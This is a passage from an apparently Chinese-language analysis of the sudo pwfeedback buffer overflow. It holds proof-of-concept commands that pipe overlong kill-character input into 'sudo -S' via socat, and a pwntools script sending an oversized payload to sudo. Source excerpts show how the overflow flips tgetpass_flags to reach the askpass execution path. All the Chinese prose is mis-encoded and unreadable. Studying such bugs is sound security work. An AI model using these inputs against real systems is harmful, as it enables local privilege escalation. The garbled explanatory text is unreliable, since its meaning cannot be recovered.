<pre class="chroma"><code class="language-bash" data-lang="bash">socat pty,link<span class="o">=</span>/tmp/pty,waitslave exec:<span class="s2">&#34;python -c &#39;print((chr(0x61)*100+chr(0x15))*50)&#39;&#34;</span> <span class="p">&amp;</span>
sudo -S id &lt; /tmp/pty
</code></pre></td></tr></table>
</div>
</div><p>POC1é€šè¿‡ä»ç®¡é“è·å–æ•°æ®äº¤ç»™sudo,-Sè¡¨ç¤ºä»stdinè¯»å–æ•°æ®<br>
POC2é€šè¿‡socatåˆ›å»ºäº†ä¸€ä¸ªä¼ªç»ˆç«¯pty,sudoå¤„ç†çš„æ•°æ®ä»ç»ˆç«¯ä¸­è·å–,&ldquo;waitslave exec&quot;æ‰§è¡Œåç»­å‘½ä»¤</p>
<h4 id="è°ƒè¯•-1">è°ƒè¯•</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">os</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">TARGET</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="s2">&#34;/tmp/build/bin/sudo&#34;</span><span class="p">)</span>

<span class="s1">&#39;&#39;&#39;
</span><span class="s1">Create a pty terminal to transmit payload
</span><span class="s1">mfd, sfd = os.openpty()
</span><span class="s1">fd = os.open(os.ttyname(sfd), os.O_RDONLY)
</span><span class="s1">p = process([TARGET,&#34;-S&#34;, &#34;id&#34;],stdin=fd)
</span><span class="s1">&#39;&#39;&#39;</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">TARGET</span><span class="p">,</span><span class="s2">&#34;-S&#34;</span><span class="p">,</span><span class="s2">&#34;id&#34;</span><span class="p">])</span>
<span class="n">pause</span><span class="p">()</span>
<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">100</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">*</span><span class="mi">50</span>
<span class="c1">#os.write(mfd, payload+&#34;n&#34;)</span>
<span class="n">pause</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>åœ¨ç¬¬ä¸€æ¬¡pauseçš„æ—¶å€™,æ‰“å¼€å¦å¤–ä¸€ä¸ªç»ˆç«¯è¿›å…¥GDB,åˆ©ç”¨<code>attach pid</code>æŒ‡ä»¤è°ƒè¯•è¿›ç¨‹,åˆ™ä¼šå› ä¸ºpauseè€Œæ–­ç‚¹åœ¨ç›¸åº”ä½ç½®</p>
<h4 id="åˆ†ææ¼æ´ä»£ç ">åˆ†ææ¼æ´ä»£ç </h4>
<p>é¦–å…ˆsudoè¾“å…¥çš„æ—¶å€™,è°ƒç”¨çš„å‡½æ•°æ˜¯getln<br>
åœ¨ç»ˆç«¯æ‰§è¡ŒPOC1,ç¨‹åºåœ¨int getln tgetpass.c:345æŠ¥é”™</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">extern</span> <span class="kt">int</span> <span class="n">sudo_term_erase</span><span class="p">,</span> <span class="n">sudo_term_kill</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="nf">getln</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">bufsiz</span><span class="p">,</span> <span class="kt">int</span> <span class="n">feedback</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">size_t</span> <span class="n">left</span> <span class="o">=</span> <span class="n">bufsiz</span><span class="p">;</span>
    <span class="n">ssize_t</span> <span class="n">nr</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">cp</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
    <span class="n">debug_decl</span><span class="p">(</span><span class="n">getln</span><span class="p">,</span> <span class="n">SUDO_DEBUG_CONV</span><span class="p">)</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">left</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">errno</span> <span class="o">=</span> <span class="n">EINVAL</span><span class="p">;</span>
	<span class="n">debug_return_str</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>		<span class="cm">/* sanity */</span>
    <span class="p">}</span>

    <span class="k">while</span> <span class="p">(</span><span class="o">--</span><span class="n">left</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">nr</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">nr</span> <span class="o">!=</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;\r&#39;</span><span class="p">)</span>
	    <span class="k">break</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">feedback</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="n">sudo_term_kill</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">while</span> <span class="p">(</span><span class="n">cp</span> <span class="o">&gt;</span> <span class="n">buf</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="k">if</span> <span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\b</span><span class="s"> </span><span class="se">\b</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
				<span class="k">break</span><span class="p">;</span>
				<span class="o">--</span><span class="n">cp</span><span class="p">;</span>
			<span class="p">}</span>
			<span class="n">left</span> <span class="o">=</span> <span class="n">bufsiz</span><span class="p">;</span>
			<span class="k">continue</span><span class="p">;</span>
	    <span class="p">}</span>
	    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="n">sudo_term_erase</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">cp</span> <span class="o">&gt;</span> <span class="n">buf</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="k">if</span> <span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\b</span><span class="s"> </span><span class="se">\b</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
				<span class="k">break</span><span class="p">;</span>
				<span class="o">--</span><span class="n">cp</span><span class="p">;</span>
				<span class="n">left</span><span class="o">++</span><span class="p">;</span>
			<span class="p">}</span>
			<span class="k">continue</span><span class="p">;</span>
	    <span class="p">}</span>
	    <span class="n">ignore_result</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&#34;*&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">));</span>
	<span class="p">}</span>
	<span class="o">*</span><span class="n">cp</span><span class="o">++</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">......</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>å¦‚æœsudoå¼€å¯äº†pwfeedback,ä¹‹åè¿›è¡Œä¸¤ä¸ªåˆ¤æ–­</p>
<pre><code>sudo_term_kill: åˆ é™¤æ‰€æœ‰å­—ç¬¦,å¯è¾“å…¥å­—ç¬¦æ•°é‡lefté‡æ–°èµ‹å€¼ä¸ºbufsiz
sudo_term_erase:åˆ é™¤å•ä¸ªå­—ç¬¦,å¯è¾“å…¥å­—ç¬¦æ•°é‡leftè‡ªå¢1
</code></pre>
<p>æ¼æ´ç‚¹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">if</span> <span class="p">(</span><span class="n">feedback</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="n">sudo_term_kill</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">while</span> <span class="p">(</span><span class="n">cp</span> <span class="o">&gt;</span> <span class="n">buf</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="k">if</span> <span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\b</span><span class="s"> </span><span class="se">\b</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
					<span class="k">break</span><span class="p">;</span>
				<span class="o">--</span><span class="n">cp</span><span class="p">;</span>
			<span class="p">}</span>
			<span class="n">left</span> <span class="o">=</span> <span class="n">bufsiz</span><span class="p">;</span>
			<span class="k">continue</span><span class="p">;</span>
	    <span class="p">}</span>
	    <span class="p">......</span>
</code></pre></td></tr></table>
</div>
</div><p>è‹¥ä»ç®¡é“è¯»å–æ•°æ®,å› ä¸ºç®¡é“æ˜¯å•å‘çš„,é‚£ä¹ˆ<code>write(fd, &quot;\b \b&quot;, 3) == -1</code>æ€»æ˜¯æˆç«‹,breakè·³å‡ºwhileå¾ªç¯,ä»¤å˜é‡<code>left</code>é‡æ–°èµ‹å€¼ä¸º<code>bufsiz</code></p>
<p>å› ä¸ºå˜é‡<code>left</code>é‡æ–°èµ‹å€¼ä¸º<code>bufsiz</code>,æ‰€ä»¥whileå¾ªç¯ç»§ç»­è¿è¡Œ,æ•…æ­¤å¤„å¯ä»¥ç»§ç»­æ‹·è´æ•°æ®,è€Œæ­¤å¤„æ‹·è´åˆ°çš„<code>buf</code>æŒ‡é’ˆæ˜¯ä¸€ä¸ªBSSæ®µä¸Šçš„å˜é‡</p>
<p>è€Œåœ¨BSSæ®µä¸Š,bufæŒ‡é’ˆåå­˜åœ¨<code>askpass_6192ã€signoã€tgetpass_flagsã€user_details_0</code>ç­‰å¤šä¸ªBSSä¸Šçš„å˜é‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="cm">/*
</span><span class="cm"> * Like getpass(3) but with timeout and echo flags.
</span><span class="cm"> */</span>
<span class="kt">char</span> <span class="o">*</span><span class="nf">tgetpass</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">prompt</span><span class="p">,</span> <span class="kt">int</span> <span class="n">timeout</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span><span class="k">struct</span> <span class="n">sudo_conv_callback</span> <span class="o">*</span><span class="n">callback</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">sigaction</span> <span class="n">sa</span><span class="p">,</span> <span class="n">savealrm</span><span class="p">,</span> <span class="n">saveint</span><span class="p">,</span> <span class="n">savehup</span><span class="p">,</span> <span class="n">savequit</span><span class="p">,</span> <span class="n">saveterm</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">sigaction</span> <span class="n">savetstp</span><span class="p">,</span> <span class="n">savettin</span><span class="p">,</span> <span class="n">savettou</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">pass</span><span class="p">;</span>
    <span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">askpass</span><span class="p">;</span>
    <span class="k">static</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">SUDO_CONV_REPL_MAX</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="n">output</span><span class="p">,</span> <span class="n">save_errno</span><span class="p">,</span> <span class="n">neednl</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">need_restart</span><span class="p">;</span>
    <span class="n">debug_decl</span><span class="p">(</span><span class="n">tgetpass</span><span class="p">,</span> <span class="n">SUDO_DEBUG_CONV</span><span class="p">)</span>

    <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">askpass</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
		<span class="n">askpass</span> <span class="o">=</span> <span class="n">getenv_unhooked</span><span class="p">(</span><span class="s">&#34;SUDO_ASKPASS&#34;</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">askpass</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="o">*</span><span class="n">askpass</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span>
			<span class="n">askpass</span> <span class="o">=</span> <span class="n">sudo_conf_askpass_path</span><span class="p">();</span>  <span class="c1">//get the askpass from the environment
</span><span class="c1"></span>    <span class="p">}</span>

    <span class="cm">/* If no tty present and we need to disable echo, try askpass. */</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ISSET</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">TGP_STDIN</span><span class="o">|</span><span class="n">TGP_ECHO</span><span class="o">|</span><span class="n">TGP_ASKPASS</span><span class="o">|</span><span class="n">TGP_NOECHO_TRY</span><span class="p">)</span> <span class="o">&amp;&amp;!</span><span class="n">tty_present</span><span class="p">())</span>
    <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">askpass</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">getenv_unhooked</span><span class="p">(</span><span class="s">&#34;DISPLAY&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">sudo_warnx</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;no tty present and no askpass program specified&#34;</span><span class="p">));</span>
			<span class="n">debug_return_str</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="n">SET</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">TGP_ASKPASS</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/* If using a helper program to get the password, run it instead. */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ISSET</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">TGP_ASKPASS</span><span class="p">))</span>
    <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">askpass</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="o">*</span><span class="n">askpass</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span>
			<span class="n">sudo_fatalx</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;no askpass program specified, try setting SUDO_ASKPASS&#34;</span><span class="p">));</span>
		<span class="n">debug_return_str_masked</span><span class="p">(</span><span class="n">sudo_askpass</span><span class="p">(</span><span class="n">askpass</span><span class="p">,</span> <span class="n">prompt</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="c1">//.......
</span><span class="c1"></span>    <span class="n">pass</span> <span class="o">=</span> <span class="n">getln</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">ISSET</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">TGP_MASK</span><span class="p">));</span>
    <span class="c1">//......
</span><span class="c1"></span><span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>å› ä¸ºç¬¬ä¸€æ¬¡<code>tgetpass_flags</code>æ²¡æœ‰å¼€å¯<code>TGP_ASKPASS</code>,é‚£ä¹ˆä¼šé€šè¿‡åé¢çš„<code>getln(input, buf, sizeof(buf), ISSET(flags, TGP_MASK));</code>è¿›è¡Œå†™å…¥,æ­¤æ—¶å¼€å¯äº†feedbacké€‰é¡¹,å¯ä»¥å½¢æˆè¶Šç•Œä¿®æ”¹<code>tgetpass_flags</code>å˜é‡çš„å€¼</p>
<p>åˆå› ä¸ºsudoä¼šæœ‰ä¸‰æ¬¡è¾“å…¥çš„æœºä¼š,å¦‚æœä»¤<code>tgetpass_flags</code>å¼€å¯<code>TGP_ASKPASS</code>é€‰é¡¹</p>
<p>å…¶ä¸­<code>tgetpass_flags</code>çš„å„æ ‡å¿—ä½å€¼ä½äºsudo.h</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cp">#define TGP_NOECHO  0x00        </span><span class="cm">/* turn echo off reading pw (default) */</span><span class="cp">
</span><span class="cp">#define TGP_ECHO    0x01        </span><span class="cm">/* leave echo on when reading passwd */</span><span class="cp">
</span><span class="cp">#define TGP_STDIN   0x02        </span><span class="cm">/* read from stdin, not /dev/tty */</span><span class="cp">
</span><span class="cp">#define TGP_ASKPASS 0x04        </span><span class="cm">/* read from askpass helper program */</span><span class="cp">
</span><span class="cp">#define TGP_MASK    0x08        </span><span class="cm">/* mask user input when reading */</span><span class="cp">
</span><span class="cp">#define TGP_NOECHO_TRY  0x10        </span><span class="cm">/* turn off echo if possible */</span><span class="cp">
</span></code></pre></td></tr></table>
</div>
</div><p>ç»§è€Œç¬¬äºŒæ¬¡è¾“å…¥å¯†ç åˆ™è°ƒç”¨<code>sudo_askpass</code>å‡½æ•°,ç»§ç»­æŸ¥çœ‹<code>sudo_askpass</code>å‡½æ•°æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="cm">/*
</span><span class="cm"> * Fork a child and exec sudo-askpass to get the password from the user.
</span><span class="cm"> */</span>
<span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="nf">sudo_askpass</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">askpass</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">prompt</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">static</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">SUDO_CONV_REPL_MAX</span> <span class="o">+</span> <span class="mi">1</span><span class="p">],</span> <span class="o">*</span><span class="n">pass</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">sigaction</span> <span class="n">sa</span><span class="p">,</span> <span class="n">savechld</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">pfd</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">status</span><span class="p">;</span>
    <span class="n">pid_t</span> <span class="n">child</span><span class="p">;</span>
    <span class="n">debug_decl</span><span class="p">(</span><span class="n">sudo_askpass</span><span class="p">,</span> <span class="n">SUDO_DEBUG_CONV</span><span class="p">)</span>

    <span class="cm">/* Set SIGCHLD handler to default since we call waitpid() below. */</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sa</span><span class="p">));</span>
    <span class="n">sigemptyset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">.</span><span class="n">sa_mask</span><span class="p">);</span>
    <span class="n">sa</span><span class="p">.</span><span class="n">sa_flags</span> <span class="o">=</span> <span class="n">SA_RESTART</span><span class="p">;</span>
    <span class="n">sa</span><span class="p">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">SIG_DFL</span><span class="p">;</span>
    <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">sigaction</span><span class="p">(</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">savechld</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pipe</span><span class="p">(</span><span class="n">pfd</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	<span class="n">sudo_fatal</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;unable to create pipe&#34;</span><span class="p">));</span>

    <span class="n">child</span> <span class="o">=</span> <span class="n">sudo_debug_fork</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	<span class="n">sudo_fatal</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;unable to fork&#34;</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	<span class="cm">/* child, point stdout to output side of the pipe and exec askpass */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">pfd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">STDOUT_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
	    <span class="n">sudo_warn</span><span class="p">(</span><span class="s">&#34;dup2&#34;</span><span class="p">);</span>
	    <span class="n">_exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">setuid</span><span class="p">(</span><span class="n">ROOT_UID</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	    <span class="n">sudo_warn</span><span class="p">(</span><span class="s">&#34;setuid(%d)&#34;</span><span class="p">,</span> <span class="n">ROOT_UID</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">setgid</span><span class="p">(</span><span class="n">user_details</span><span class="p">.</span><span class="n">gid</span><span class="p">))</span> <span class="p">{</span>
	    <span class="n">sudo_warn</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;unable to set gid to %u&#34;</span><span class="p">),</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">user_details</span><span class="p">.</span><span class="n">gid</span><span class="p">);</span>
	    <span class="n">_exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">setuid</span><span class="p">(</span><span class="n">user_details</span><span class="p">.</span><span class="n">uid</span><span class="p">))</span> <span class="p">{</span>
	    <span class="n">sudo_warn</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;unable to set uid to %u&#34;</span><span class="p">),</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">user_details</span><span class="p">.</span><span class="n">uid</span><span class="p">);</span>
	    <span class="n">_exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">closefrom</span><span class="p">(</span><span class="n">STDERR_FILENO</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
	<span class="n">execl</span><span class="p">(</span><span class="n">askpass</span><span class="p">,</span> <span class="n">askpass</span><span class="p">,</span> <span class="n">prompt</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span> <span class="c1">//æ‰§è¡Œç¨‹åº
</span><span class="c1"></span>	<span class="p">......</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
